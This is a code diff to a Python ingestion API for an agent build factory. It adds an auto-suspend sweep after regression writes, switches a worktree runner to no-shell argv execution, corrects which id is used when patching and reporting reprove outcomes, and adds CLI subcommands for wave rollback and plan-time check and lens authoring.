         existing_meta = existing.get("meta") or {}
@@ -1059,6 +1336,7 @@ def regress_for_check(project: str, ticket_ids: list[str], check_id: str, entry:
         regression_detail = _ts.accumulate_regression_detail(
             existing_meta.get("regression_detail"), dict(entry))
         cycles = _ts.bumped_regress_cycles(existing_meta, check_id, count)
+        detail_by_ticket[tid] = regression_detail
         if count > cap:
             reason = (f"regress-cycle cap ({cap}) tripped for check {check_id!r} on ticket "
                       f"{tid!r}: {count - 1} prior rerun(s) still failed it — parked for "
@@ -1080,6 +1358,13 @@ def regress_for_check(project: str, ticket_ids: list[str], check_id: str, entry:
         outcome["regressed"].append(tid)
     if detail:
         _praxis.regress_requirements(project, list(detail.keys()), detail=detail)
+    # D2: the auto-suspend sweep runs AFTER the writes land, over the SAME accumulated history that
+    # was just written, for every ticket this call touched (regressed or parked).
+    for tid in outcome["regressed"] + outcome["parked"]:
+        suspend_by_ticket[tid] = attempt_auto_suspend(
+            check_id, project, tid, detail_by_ticket[tid], identity=authenticated_as)
+    outcome["regression_detail"] = detail_by_ticket
+    outcome["auto_suspend"] = suspend_by_ticket
     return outcome
 
 
@@ -1427,7 +1712,9 @@ def decode_bundle(meta: dict[str, Any]) -> bytes:
 # live project checkout, whose HEAD must not move (concurrent sessions share it).
 
 def _default_worktree_runner(run: str, cwd: Path) -> bool:  # pragma: no cover - real subprocess
-    return subprocess.run(run, shell=True, cwd=str(cwd), check=False).returncode == 0
+    """Same argv-vector, no-shell execution as :func:`_default_runner` (D5), pinned to the
+    disposable worktree the proof materialized."""
+    return subprocess.run(parse_run_body(run), cwd=str(cwd), check=False).returncode == 0
 
 
 def run_fail_then_pass_proof(run: str, *, bad_artifact_meta: dict[str, Any],
@@ -1570,7 +1857,10 @@ def reprove_quiet_checks(project: str, *, now: float | None = None,
             meta, now=now, cadence_seconds=cadence_seconds
         ):
             continue
-        check_id = check.get("id")
+        # D1: PATCH by the Praxis fact id, but REPORT the authored id -- an outcome a caller can
+        # feed straight back into suspend/widen/upgrade_on_first_pass without it raising.
+        fact_id = check.get("id")
+        check_id = meta.get("check_id") or fact_id
         artifact_id = meta.get("artifact_id")
         artifact_meta = artifact_reader(meta) if artifact_reader is not None else (
             (read_artifact(artifact_id).get("meta") if artifact_id else None)
@@ -1584,7 +1874,7 @@ def reprove_quiet_checks(project: str, *, now: float | None = None,
                 healthy_repo_path=healthy_repo_path or ".", executor=executor,
             )
             if verdict["status"] == "proven":
-                _praxis.patch_meta(check_id, {"reprove_at": now}, space=project,
+                _praxis.patch_meta(fact_id, {"reprove_at": now}, space=project,
                                    snapshot=BUILDING_VALIDATION_SNAPSHOT)
                 outcomes.append({"check_id": check_id, "result": "kept-gating", "reason": "still-failing"})
                 continue
@@ -1593,7 +1883,7 @@ def reprove_quiet_checks(project: str, *, now: float | None = None,
         # Both demotion branches above (no usable artifact/run, or a non-proven re-prove verdict)
         # reach here needing the SAME transition — computed once rather than duplicated per branch.
         new_state = transition_enforcement_state(STATE_GATING, EVENT_PROOF_DEMOTED)
-        _praxis.patch_meta(check_id, {M_ENFORCEMENT_STATE: new_state, "reprove_at": now,
+        _praxis.patch_meta(fact_id, {M_ENFORCEMENT_STATE: new_state, "reprove_at": now,
                                       "reprove_reason": reason, "patched_by": authenticated_as},
                            space=project, snapshot=BUILDING_VALIDATION_SNAPSHOT)
         outcomes.append({"check_id": check_id, "result": "demoted", "reason": reason})
@@ -1613,12 +1903,48 @@ def _cmd_read(args: argparse.Namespace) -> int:
     return 0
 
 
+def _csv(value: str | None) -> list[str]:
+    return [part.strip() for part in str(value or "").split(",") if part.strip()]
+
+
+def _cmd_rollback(args: argparse.Namespace) -> int:
+    """D8 — ``rollback_wave`` had NO entry point at all: it was reachable only from a Python import
+    that nothing in the running system performs, so the named rollback unit could not actually be
+    invoked by an operator."""
+    result = rollback_wave(args.wave_id, args.project)
+    print(json.dumps(result, sort_keys=True))
+    return 0
+
+
+def _cmd_author_check(args: argparse.Namespace) -> int:
+    """D9 — the plan-time check-authoring entry point. The two intake skills that used to author
+    checks were deleted and every remaining instruction points at ``plan_time_author_check``, which
+    until now nothing could invoke: the factory had LOST the ability to author a build check."""
+    rubric = json.loads(args.rubric) if args.rubric else None
+    written = plan_time_author_check(
+        args.text, args.project, applies_to=_csv(args.applies_to) or None,
+        run=args.run, rubric=rubric, surfaces=_csv(args.surfaces) or None, source=args.source,
+    )
+    print(json.dumps({"id": written.get("id"), "action": written.get("action")}, sort_keys=True))
+    return 0
+
+
+def _cmd_author_lens(args: argparse.Namespace) -> int:
+    """D9's planning-lens half — same lost-capability restoration for ``plan_time_author_lens``."""
+    written = plan_time_author_lens(
+        args.text, args.project, applies_to=_csv(args.applies_to) or None, source=args.source,
+    )
+    print(json.dumps({"id": written.get("id"), "action": written.get("action")}, sort_keys=True))
+    return 0
+
+
 def main(argv: list[str] | None = None) -> int:
     ap = argparse.ArgumentParser(
         prog="agent_factory.ingestion_api",
         description="The sole writer of the shared factory-learnings space (FL1) and of every "
                     "project's building/planning validation checks (FL2). This CLI shell covers the "
-                    "lesson read/write primitives only; the full ingest/widen/suspend/kill-switch/"
+                    "lesson read/write primitives, plan-time check/lens authoring (R1a) and the "
+                    "named wave rollback (D9/E14); the full ingest/widen/suspend/kill-switch/"
                     "regress/reclassify sequence (R1) is the agent_factory.ingestion_api Python API.")
     sub = ap.add_subparsers(dest="command", required=True)
 
@@ -1631,6 +1957,36 @@ def main(argv: list[str] | None = None) -> int:
     read.add_argument("query", nargs="?", default="", help="similarity query; omit for all lessons")
     read.add_argument("--top-k", type=int, default=10, dest="top_k")
     read.set_defaults(func=_cmd_read)
+
+    rollback = sub.add_parser(
+        "rollback-wave", help="archive every check and annotate every lesson one ingestion wave "
+                              "wrote — the named rollback unit (D9/E14)")
+    rollback.add_argument("wave_id", help="the wave id returned by an ingest call")
+    rollback.add_argument("--project", required=True, help="the project space owning the checks")
+    rollback.set_defaults(func=_cmd_rollback)
+
+    author = sub.add_parser(
+        "author-check", help="author ONE plan-time building-validation check (R1a): no lesson, no "
+                             "proof, hash-pinned and gating on arrival")
+    author.add_argument("text", help="the check criterion")
+    author.add_argument("--project", required=True, help="the project space to write into")
+    author.add_argument("--applies-to", default=None, dest="applies_to",
+                        help="comma-separated ticket tags; omit for the '*' wildcard")
+    author.add_argument("--run", default=None, help="the binary check's run body (argv, no shell)")
+    author.add_argument("--rubric", default=None, help="a graded check's rubric, as JSON")
+    author.add_argument("--surfaces", default=None, help="comma-separated surface ids")
+    author.add_argument("--source", default=None, help="provenance pointer")
+    author.set_defaults(func=_cmd_author_check)
+
+    lens = sub.add_parser(
+        "author-lens", help="author ONE planning-validation lens (R1a) and re-arm the plan "
+                            "blessing audit so it must reconvene to close it")
+    lens.add_argument("text", help="the lens text")
+    lens.add_argument("--project", required=True, help="the project space to write into")
+    lens.add_argument("--applies-to", default=None, dest="applies_to",
+                      help="comma-separated ticket tags; omit for the '*' wildcard")
+    lens.add_argument("--source", default=None, help="provenance pointer")
+    lens.set_defaults(func=_cmd_author_lens)
 
     args = ap.parse_args(argv)
     return int(args.func(args))
